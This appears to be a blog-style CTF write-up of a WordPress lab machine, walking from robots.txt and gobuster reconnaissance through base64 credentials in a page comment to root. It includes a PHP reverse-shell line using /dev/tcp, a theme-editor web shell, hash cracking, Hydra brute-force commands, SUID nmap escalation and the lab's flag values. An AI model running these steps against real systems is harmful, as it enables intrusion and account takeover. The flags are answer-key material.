# From Gobuster to Game Over: A WordPress Penetration Testing Tale 💀

## The One Where a Robots.txt File Changed Everything

---

### The Setup

So picture this: I'm sitting in my chair, coffee getting cold, just another penetration testing engagement. Target IP? `10.49.158.128`. Nothing fancy. Just another box to poke, prod, and hopefully break into.

Fired up Kali, connected to the VPN, and thought "let's see what we're working with."

Little did I know this would turn into one of those "why the hell did they leave that there" moments that make this job fun.

---

## Phase 1: The "Let's Just Check" Moment

Before going all-in with heavy tools, I hit the simplest endpoint first:

```
http://10.49.158.128/robots.txt
```

Robots.txt - that file that's supposed to tell search engines what *not* to index. In CTFs? It's basically a treasure map with blinking arrows.

And boom:

```
User-agent: *
Disallow: /
Disallow: /wp-admin/
Disallow: /wp-includes/

key-1-of-3.txt
fsocity.dic
```

**First flag dropped:** `073403c8a58a1f80d943455fb30724b9`

Just like that, 10 seconds in, and we've got our first win. The `fsocity.dic` file looked juicy too - a massive wordlist. Saved that for later.

---

## Phase 2: The Gobuster Chronicles

Now came the real fun. Fired up Gobuster:

```bash
gobuster dir -u http://10.49.158.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

What came back was... interesting:

```
/.hta                 (Status: 403)
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/0                    (Status: 301) [--> /0/]
/admin                (Status: 301) [--> /admin/]
/audio                (Status: 301) [--> /audio/]
/blog                 (Status: 301) [--> /blog/]
/css                  (Status: 301) [--> /css/]
/dashboard            (Status: 302) [--> /wp-admin/]
/favicon.ico          (Status: 200)
/images               (Status: 301) [--> /images/]
/index.html           (Status: 200)
/index.php            (Status: 301) [--> /]
/intro                (Status: 200) [516KB]
/js                   (Status: 301) [--> /js/]
/login                (Status: 302) [--> /wp-login.php]
/phpmyadmin           (Status: 403)
/readme               (Status: 200)
/robots               (Status: 200)
/sitemap              (Status: 200)
/sitemap.xml          (Status: 200)
/video                (Status: 301) [--> /video/]
/wp-admin             (Status: 301) [--> /wp-admin/]
/wp-content           (Status: 301) [--> /wp-content/]
/wp-includes          (Status: 301) [--> /wp-includes/]
/wp-config            (Status: 200) [0 bytes]
/wp-login             (Status: 200)
/xmlrpc               (Status: 405)
/xmlrpc.php           (Status: 405)
```

The `/wp-config` caught my eye immediately. **0 bytes?** That's suspicious. Either it's empty (unlikely) or it's readable but empty for a reason. Noted.

The `/wp-login.php` confirmed what we suspected - **WordPress**. And `/wp-admin` redirecting? Classic WordPress behaviour.

---

## Phase 3: The "/license" Goldmine

While poking around, I noticed `/license` was returning a 200. Opened it up:

```
[Some random license text]
```

Nothing special, right? But **CTF rule #1: ALWAYS VIEW PAGE SOURCE**

Ctrl+U and... wait, what's this at the bottom?

```html
<!-- 
ZWxsaW90OkVSMjgtMDY1Mg==
-->
```

Base64. Decoded it:

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mg==" | base64 -d
```

```
elliot:ER28-0652
```

**Bruh.** They literally left credentials in a comment. Not even hidden properly.

Logged into `/wp-login.php` with:

```
Username: elliot
Password: ER28-0652
```

✅ Login successful!

---

## Phase 4: WordPress Admin → Reverse Shell (The Classic)

Inside WordPress admin, I went straight to:

**Appearance → Theme Editor**

Found `archive.php` in the Twenty Fifteen theme. Replaced the entire thing with a PHP reverse shell payload from [RevShells.com](https://www.revshells.com/).

**⚠️ Important:** Set the IP to your VPN IP (tun0), not the target IP. Common rookie mistake.

```php
<?php
// PHP reverse shell payload
// Set IP to your VPN IP (tun0)
// Port: 4444
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.x.x.x/4444 0>&1'");
?>
```

Started listener:

```bash
nc -lvnp 4444
```

Then hit:

```
http://10.49.158.128/wp-content/themes/twentyfifteen/archive.php
```

**And BOOM - reverse shell.** 🚀

```bash
whoami
www-data
```

---

## Phase 5: Shell Stabilization & User Switching

First thing I noticed - the shell was wonky. Arrow keys not working, no tab completion, `su` wasn't working properly.

Fixed it with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we're cooking.

Checked `/home/robot` and found two files:

```
key-2-of-3.txt
password.raw-md5
```

Second key was permission denied, but the hash was readable:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

MD5 hash. Cracked it quickly:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hash
hashcat -m 0 robot.hash /usr/share/wordlists/rockyou.txt
```

**Password:** `abcdefghijklmnopqrstuvwxyz`

Switched to robot:

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

**Got the second key:** 🎉

```
822c73956184f694993bede3eb39f959
```

---

## Phase 6: Privilege Escalation - The SUID Goldmine

Now for the final boss - getting root.

Checked SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

What caught my eye:

```
/usr/local/bin/nmap
```

**Wait, what?** Nmap in `/usr/local/bin` with SUID? That's not normal.

Checked version:

```bash
/usr/local/bin/nmap --version
```

Old version. Like, *really* old. And old versions had an interactive mode.

```bash
/usr/local/bin/nmap --interactive
```

Inside the interactive prompt:

```
nmap> !sh
```

**Boom. Root shell.** 💀

```bash
whoami
root
```

**Third and final key:** 🏆

```
04787ddef27c3dee1ee161b21670b4e4
```

---

## Alternative Route: The Hydra Way

If the `/license` trick didn't work, here's how you'd do it with Hydra.

First, clean the wordlist:

```bash
sort fsocity.dic | uniq > fs-list
```

Find valid username:

```bash
hydra -L fs-list -p test 10.49.158.128 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

**Found:** `elliot`

Then crack password:

```bash
hydra -l elliot -P fs-list 10.49.158.128 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

**Found:** `ER28-0652`

Same result, longer path.

---

## Key Takeaways

This room was beautiful because it connected so many dots:

1. **Robots.txt isn't just for SEO** - It's often a cheat sheet
2. **Page source comments** - People STILL leave credentials in comments
3. **WordPress theme editor** - One of the most dangerous features if left enabled
4. **Reverse shells need YOUR IP** - Learned this the hard way years ago
5. **Shell stabilization** - `python3 -c 'import pty; pty.spawn("/bin/bash")'` is your best friend
6. **SUID binaries in odd locations** - `/usr/local/bin/nmap` was the MVP
7. **Old software = exploitable** - The interactive mode in old nmap is a known trick

---

## Final Thoughts

This wasn't about breaking into something super secure. It was about connecting the dots - web enumeration, WordPress exploitation, shell access, user switching, and privilege escalation. Every step built on the previous one.

And honestly? The `license` file with Base64 credentials was the most CTF thing I've ever seen. Peak "we'll just hide it in plain sight" energy.

---

## Flags

| Flag | Value |
|------|-------|
| **Key 1** | `073403c8a58a1f80d943455fb30724b9` |
| **Key 2** | `822c73956184f694993bede3eb39f959` |
| **Key 3** | `04787ddef27c3dee1ee161b21670b4e4` |

---
